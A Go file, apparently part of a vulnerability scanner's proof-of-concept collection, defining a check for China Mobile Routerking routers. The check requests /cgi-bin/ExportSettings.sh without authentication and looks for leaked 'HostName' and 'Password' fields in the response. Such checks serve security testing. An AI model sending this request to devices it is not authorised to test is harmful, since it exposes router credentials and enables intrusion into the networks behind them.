package poc

func (Info *PocInfo) Routerking_ExportSettings_INFO_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = ""
	poc.Info.Target = "routerking"
	poc.Info.Type = "INFO"
	poc.Info.Name = "China Mobile Routerking ExportSettings.sh INFO"
	poc.Info.Level = 2
	poc.Info.Author = "youzai"

	// 设置poc-Poc信息
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/cgi-bin/ExportSettings.sh"}
	poc.Poc.Param = []string{""}
	poc.Poc.Header = nil
	poc.Poc.Data = nil
	poc.Poc.Word = []string{"HostName", "Password"}

	// 设置poc-Config信息
	poc.Config.Customize = false

	PocStruct = append(PocStruct, poc)
}
